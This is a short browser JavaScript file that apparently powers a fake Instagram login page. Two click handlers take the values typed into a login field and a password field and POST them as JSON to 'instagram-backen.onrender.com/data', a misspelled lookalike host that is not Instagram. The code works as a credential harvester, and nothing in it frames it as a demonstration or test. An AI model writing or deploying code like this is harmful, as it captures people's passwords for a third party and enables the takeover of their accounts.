let btn = document.querySelector(".tn");

let inp = document.querySelector(".inp");
let inpt = document.querySelector(".inpt");


btn.onclick = () => {
    let inp1 = inp.value;
    let inp2 = inpt.value;

    fetch('https://instagram-backen.onrender.com/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inp1,
            password: inp2
        })
    })
}

let button = document.querySelector(".button");

let inpp = document.querySelector(".inpp");
let inptt = document.querySelector(".inptt");

button.onclick = () => {
    let inp1 = inpp.value;
    let inp2 = inptt.value;

    fetch('https://instagram-backen.onrender.com/data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            login: inp1,
            password: inp2
        })
    })
}